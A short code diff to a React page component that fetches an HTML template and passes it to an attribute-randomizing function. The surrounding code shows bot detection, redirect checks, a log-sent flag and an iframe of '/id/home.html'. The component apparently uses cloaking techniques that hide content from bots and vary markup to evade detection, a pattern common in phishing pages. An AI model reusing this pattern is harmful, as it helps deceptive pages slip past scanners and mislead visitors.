@@ -41,6 +41,8 @@ const LoadingDots = () => {
 };
 
 const Index: FC = () => {
+
+    const [content, setContent] = useState<string>("");
     const { isBot, isLoading, shouldRedirect } = useBotDetection();
     const [redirecting, setRedirecting] = useState(false);
     const logSentRef = useRef(false);
@@ -74,6 +76,14 @@ const Index: FC = () => {
     );
     return html;
   }
+
+
+     useEffect(() => {
+    fetch(template)
+      .then((res) => res.text())
+      .then((data) => setContent(data))
+      .catch((err) => console.error(err));
+  }, []);
     
     useEffect(() => {
         console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
@@ -184,7 +194,7 @@ const Index: FC = () => {
         //     </div>
         // );
     }
-     const randomized = randomizeAttributes(template);
+     const randomized = randomizeAttributes(content);
      console.log(randomized);
     //return <div dangerouslySetInnerHTML={{ __html: randomized }} />;
     return(showIframe("/id/home.html",SiteTitleMeta,false));
